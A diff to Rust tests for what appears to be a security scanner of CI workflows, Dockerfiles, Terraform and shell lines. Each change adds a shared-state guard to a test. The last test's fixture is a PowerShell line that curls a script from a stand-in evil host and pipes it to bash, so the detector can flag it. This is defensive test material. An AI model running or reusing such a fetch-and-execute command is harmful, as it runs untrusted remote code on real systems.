@@ -2391,6 +2391,7 @@ mod tests {
 
     #[test]
     fn workflow_unpinned_count_folded() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let wf = "steps:\n  - uses: actions/checkout@v4\n  - uses: actions/setup-node@v3\n";
         let findings = run(wf, ".github/workflows/ci.yml");
         let unpinned: Vec<_> = findings
@@ -3371,6 +3372,7 @@ mod tests {
 
     #[test]
     fn workflow_excessive_permissions_title_survives_mandatory_redaction() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // The bare `GITHUB_TOKEN for` shape taught the mandatory value
         // redactor to eat the word after the alias mid-title; the backticked
         // form must not regress.
@@ -3507,6 +3509,7 @@ mod tests {
 
     #[test]
     fn workflow_checkout_base_no_ref_clean() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // pull_request_target that checks out the base (no untrusted ref) must
         // NOT fire the checkout rule (it still fires the trigger rule).
         let wf = format!(
@@ -3700,6 +3703,7 @@ mod tests {
 
     #[test]
     fn dockerfile_multi_from_two_unpinned_folds_to_one_finding() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // A multi-stage build with two distinct un-pinned external base images
         // (a `:latest` build stage and an un-tagged runtime stage). The two
         // un-pinned FROM lines fold into ONE finding; the `FROM builder` stage
@@ -3839,6 +3843,7 @@ mod tests {
 
     #[test]
     fn terraform_non_ascii_only_does_not_panic() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // Smaller variant: a `.tf` line that is *entirely* non-ASCII (e.g.
         // a stray comment a translator added) must not crash even when
         // there is no `source` token anywhere in the file.
@@ -3965,6 +3970,7 @@ mod tests {
 
     #[test]
     fn recovered_cross_shell_body_uses_its_declared_shell() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let analysis =
             analyze_shell_line("pwsh -Command 'curl https://evil.example/install.ps1 | bash'");
         assert!(analysis.curl_pipe_shell, "{analysis:?}");
